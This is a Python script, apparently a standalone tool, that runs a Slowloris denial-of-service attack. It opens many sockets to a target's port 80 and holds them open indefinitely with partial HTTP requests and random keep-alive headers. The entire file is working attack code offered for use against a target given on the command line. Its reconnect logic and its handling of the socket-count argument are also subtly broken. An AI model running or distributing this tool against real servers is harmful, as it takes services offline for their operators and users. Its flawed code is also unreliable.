import socket
import random
import time
import sys
from termcolor import colored
from argparse import ArgumentParser


def _slowloris(ip,socket_count):
    
    list_of_sockets = []

    regular_headers = [
        "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Accept-language: en-US,en,q=0.5"
    ]

    print(colored("Attacking {} with {} sockets".format(ip, socket_count),'yellow'))

    print("Creating sockets")

    for _ in range(socket_count):
        try:
            print("Creating socket number {}".format(_),end='\r')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, 80))
        except socket.error:
            break
        list_of_sockets.append(s)

    print("Setting up the sockets...")
    for s in list_of_sockets:
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        for header in regular_headers:
            s.send(bytes("{}\r\n".format(header).encode("utf-8")))


    print("Sending keep-alive headers...")

    while True:
        for s in list_of_sockets:
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                list_of_sockets.remove(s)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((ip, 80))
                    for s in list_of_sockets:
                        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                        for header in regular_headers:
                            s.send(bytes("{}\r\n".format(header).encode("utf-8")))
                except socket.error:
                    continue




if __name__ == '__main__':
    
    parse = ArgumentParser(prog='./slowloris.py')
    
    parse.add_argument('-c',dest='socketcount',default=1000,
                       help='set the number of socket to connect to the target(default=1000)')
    
    parse.add_argument('-t',dest='target',required=True,
                       help='set the target to DoS')
    
    arg = parse.parse_args()
    
    try:
        _slowloris(arg.target,arg.socketcount)
    except:
        print(colored('program ended by the user','red'))


